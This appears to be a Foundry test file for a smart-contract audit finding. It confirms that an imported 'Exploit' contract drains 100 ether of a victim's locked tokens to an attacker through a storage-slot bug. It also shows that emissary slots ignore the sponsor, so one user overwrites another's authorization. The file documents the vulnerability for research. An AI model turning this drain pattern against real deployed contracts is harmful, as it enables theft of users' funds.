// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./61280-incorrect-storage-slot-derivation-breaks-authorization-spear.sol";

contract CompactEmissarySlotTest is Test {
    function test_exploit_sharedEmissarySlotDrainsLock() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.stolen(), 100 ether);
        assertEq(e.token().balanceOf(address(e.attackerRecv())), 100 ether);
        assertEq(e.compact().locked(address(e.victim()), e.LOCK_TAG()), 0);
    }

    function test_slotIgnoresSponsor() public {
        MockERC20 token = new MockERC20("T");
        TheCompact c = new TheCompact(token);
        bytes12 tag = bytes12(uint96(0x111111111111111111111111));
        address a = address(0xA);
        address b = address(0xB);

        vm.prank(a);
        c.assignEmissary(tag, address(0xE1));
        // Different sponsor, same tag → same storage (vulnerable).
        assertEq(c.getEmissary(b, tag), address(0xE1));

        vm.prank(b);
        c.assignEmissary(tag, address(0xE2));
        assertEq(c.getEmissary(a, tag), address(0xE2));
    }
}
